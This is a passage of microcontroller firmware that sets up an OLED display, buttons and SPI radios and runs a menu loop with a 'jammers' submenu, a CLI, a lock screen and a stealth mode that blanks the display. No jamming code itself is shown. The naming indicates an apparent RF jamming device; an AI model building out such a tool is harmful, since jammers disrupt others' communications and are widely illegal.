  display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS);
  display.clearDisplay();
  display.display();
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  spiBus.begin(SPI_SCK, SPI_MISO, SPI_MOSI);
  spiBus.setFrequency(4000000);
  initRadios();

  u8g2_for_adafruit_gfx.begin(display);
  setBrightness(brightness);
  if (!stealthModeEnabled) {
    splashScreen();
    safeDelay(3000);
    drawMainMenu();
  }
}

void loop() {
  if (checkEscapeToMenu()) {
    drawMainMenu();
    return;
  }
  if (stealthModeEnabled) {
    display.clearDisplay();
    display.display();
  }
  if (currentState == STATE_MENU)
    handleMainMenu();
  else if (currentState >= STATE_SUBMENU_JAMMERS &&
           currentState <= STATE_SUBMENU_SETTINGS)
    handleSubMenu();
  else if (currentState == STATE_CLI)
    runCLI();
  else if (currentState == STATE_LOCK)
    runLock();
  else {
    executeTarget(currentState);
    currentState = STATE_MENU;
    drawMainMenu();
  }
}
